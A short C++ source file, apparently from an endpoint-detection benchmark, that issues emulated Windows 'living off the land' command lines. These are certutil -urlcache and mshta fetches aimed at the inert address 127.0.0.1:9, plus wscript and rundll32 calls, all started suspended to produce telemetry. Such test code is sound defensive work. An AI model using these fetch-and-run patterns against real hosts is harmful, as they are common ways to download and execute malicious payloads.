#include "..\common\bkaes_sample.h"

int RunLolbinCmdlines()
{
    std::wstring tempScript = BkaesTempPath(L"bkaes-script-host-test.js");
    std::wstring tempOut = BkaesTempPath(L"bkaes-certutil.out");
    BkaesWriteTextFile(tempScript, "WScript.Echo('BKAES inert script host sample');\r\n");

    std::wstring certutil = L"certutil.exe -urlcache -f http://127.0.0.1:9/bkaes.txt \"" + tempOut + L"\"";
    std::wstring mshta = L"mshta.exe http://127.0.0.1:9/bkaes.hta";
    std::wstring wscript = L"wscript.exe \"" + tempScript + L"\"";
    std::wstring rundll32 = L"rundll32.exe shell32.dll,Control_RunDLL";
    const wchar_t* commands[] = {wscript.c_str(), certutil.c_str(), mshta.c_str(), rundll32.c_str()};

    int rc = BkaesRunSuspendedCmdlines(commands, ARRAYSIZE(commands));
    BkaesSettleTelemetry();
    DeleteFileW(tempScript.c_str());
    DeleteFileW(tempOut.c_str());
    BkaesPrint("[OK] LOLBIN command-line benchmark issued\n");
    return rc;
}
